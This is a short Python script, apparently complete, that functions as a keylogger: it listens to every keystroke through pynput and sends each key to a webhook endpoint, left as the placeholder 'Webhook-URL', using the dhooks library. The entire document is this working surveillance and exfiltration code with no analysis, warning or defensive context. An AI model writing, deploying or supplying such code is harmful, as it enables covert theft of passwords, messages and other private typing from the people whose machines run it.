from dhooks import Webhook
from pynput.keyboard import Key, Listener

hook = Webhook("Webhook-URL")
def on_press(key):
    hook.send("```\n"+str(key)+"\n```")

with Listener(on_press=on_press) as listener:
    listener.join()
